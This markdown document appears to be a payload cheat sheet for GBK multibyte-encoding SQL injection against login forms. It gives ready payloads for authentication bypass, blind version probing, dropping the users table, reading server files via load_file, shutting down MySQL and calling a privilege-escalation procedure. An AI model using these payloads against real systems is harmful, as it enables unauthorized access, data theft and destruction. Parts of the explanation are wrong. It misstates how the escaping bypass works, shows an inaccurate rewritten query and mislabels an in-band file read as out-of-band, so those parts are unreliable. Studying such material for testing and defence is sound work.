# SQLi GBK Authentication Vunlerability

### SQL injection (SQLi) is a web application vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It allows the attacker to manipulate SQL queries by injecting malicious code.
One common scenario is when the application builds SQL queries dynamically with user input, allowing the attacker to modify the meaning of the original query.

#### GBK (Guojia Biaozhun) is a Chinese character encoding that allows encoding of both Chinese characters as well as ASCII characters.
The GBK authentication bypass technique exploits the way GBK encoding allows both ASCII and Chinese characters to be present in the same string.

[SQLi_GBK-Encode_Payloads](https://github.com/MolCoteH/SQLi_PayLoads/blob/SQLi/SQLi_GBK-Encode_Payloads.md)

#### Here's how it works:

    The application has a login form that takes a username and password. The input is escaped to prevent SQLi.
    However, the escaping is not done correctly for GBK strings. The ASCII characters are escaped, while the Chinese chars are left unescaped.
    The attacker submits a username like "admin%df' OR 1=1#"
    The %df' is the GBK encoding for the Chinese character 達. This bypass the escaping and allows the ' OR 1=1# SQLi payload to be injected.
    The original query was supposed to be: 

    SELECT * FROM users WHERE username='admin%df' AND password='xxx'

### But with the GBK bypass it becomes:

    SELECT * FROM users WHERE username='admin%df' OR 1=1#' AND password='xxx'

##### This changes the meaning of the query to match all users, allowing the attacker to login without knowing the password.

#### Here are some additional examples of exploiting the GBK authentication bypass:

    Blind SQL injection by triggering conditional responses:
    
    Original query:
    SELECT * FROM users WHERE username='$username'
    
    Payload: %df' AND substring(version(),1,1)='5#

##### This will check if the first character of the database version is '5', triggering different responses based on true or false.


### Abusing batched SQL statements:

    Original query:
    SELECT * FROM users WHERE username='$username'; SELECT * FROM products;

    Payload: %af'; DROP TABLE users;#

##### This will delete the entire users table while still retrieving the products.

### Exfiltrating data through out-of-band channels:

    Payload: %df' UNION SELECT 1,2,load_file('c:/server_logs.txt')#

##### This will select data from the file system and return it in the application's response.

### Command injection on MySQL:

    Original query:
    SELECT * FROM users WHERE username='$username'

    Payload: %df'; SHUTDOWN;#

##### This will execute the SHUTDOWN command and crash the MySQL server.

### Privilege escalation through stored procedures:

    Original query:
    SELECT * FROM users WHERE username='$username'

    Payload: %af'; CALL increase_privileges();#

#### So in summary, the GBK authentication bypass abuses the inconsistent escaping of GBK strings to inject malicious SQL and bypass login authentication. Proper escaping of all characters, both ASCII and Unicode, is needed to prevent this attack.
